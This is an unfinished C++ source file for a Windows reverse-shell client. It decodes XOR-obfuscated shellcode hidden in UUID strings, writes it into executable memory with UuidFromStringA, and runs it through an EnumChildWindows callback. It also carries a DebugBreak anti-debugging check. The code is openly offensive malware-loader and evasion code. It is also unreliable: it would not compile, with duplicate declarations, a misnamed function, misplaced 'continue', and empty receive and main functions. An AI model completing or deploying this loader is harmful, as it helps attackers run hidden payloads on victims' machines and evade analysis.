/*
author: @Reycecar
Windows reverse shell
*/
#include <winsock2.h>
#include <Windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <iostream>
#include <Lmcons.h>
#include <wininet.h>
#include <winsock.h>
#include <iptypes.h>
#include <iphlpapi.h>
#include <fileapi.h>
#include <string.h>
#include <rpc.h>
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "IPHLPAPI.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "Rpcrt4.lib")

#define PORT "25565" //Default port for Minecraft Java
#define SERV_ADDR "127.0.0.1"
#define DEFAULT_BUFFER_LEN 40000
using namespace std;


// example uuid value: "a74453cd-fff0-65d2-48d154b2fe4d5c3a4"
//					   68656c6c-6f77-6f72-6c64-313233343536
char* dec_uuids(char* data, RPC_CSTR key) {
	int len = sizeof(data[0]);
	int elements = sizeof data / len;
	char* key = *data; // key = first uuid value in data array
	char* callcode = *(data + 1); //callcode = second uuid value in data array
	for (int i = 1; i < elements; i++) {
		for (int j = 0; j < len; j++) {
			(data + i)[j] = (strcmp((data + i)[j], '-') == 0) ? '-' : (data + i)[j] ^ key[j];
		}
	}
	return data
}
// decrypt data using UuidFromStringA to decode data and write shellcode to memory (idea from Lazarus group)
// first UUID=XOR key | second UUID=XOR'd command code | third-last UUID=command call / shellcode
// data is an array of uuids.
int decode(char* data) {
	int elements = sizeof data / sizeof(data[0]);

	//lpAddress, dwSize, flAllocationType, flProtect
	VOID* mem = VirtualAlloc(NULL, 0x100000, 0x00002000 | 0x00001000, PAGE_EXECUTE_READWRITE); //hide this WinAPI call later
	DWORD_PTR scptr = (DWORD_PTR)mem;
	for (int i = 2; i < elements; i++) { //start at 2 bcs 0 is key and 1 is callcode
		//detect_debugger();
		
		// print statements for debugging
		printf("[*] Allocating %d of %d uuids\n", i + 1, elements);
		printf("%s\n", *(data + i));
		RPC_CSTR rpc_cstr = dec_uuid((data + i), key);
		RPC_CSTR rpc_cstr = (RPC_CSTR) * (data + i);
		//	Invoking UuidFromStringA with a memory pointer instead of a UUID pointer results in
		//the binary repressentation of the given UUID being stored in memory.
		//This is engineered this way so that it is possible to load a payload content (shellcode) into the 
		//chosen memory region.
		RPC_STATUS status = UuidFromStringA((RPC_CSTR)rpc_cstr, (UUID*)scptr);
		if (status != RPC_S_OK) {
			printf("UUID Conversion Error");
			CloseHandle(mem);
			return -1;
		}
		scptr += 16; //increment position for the next UUID in memory (16 bytes ahead)
	}
	//Specify the memory region holding the shellcode for pointer to callback in EnumChildWindows (execution)
	EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);
	CloseHandle(mem);
	return 0;
}

// receive data from server
void recv() {

}
// anti-debugging measures
void detect_debugger() {
	__try {
		DebugBreak();	//Break if debugger is present
	}
	__except (GetExceptionCode() == EXCEPTION_BREAKPOINT ?
		EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
		continue;		//if debugger not present continue
	}
}

// client automatically assumes the server is sending it XOR encrypted shellcode to execute unless
// otherwise specified in the uuid message prepend. See Readme.md for uuid message prepend codes.
void main() {
	detect_debugger();
	//recv();


}
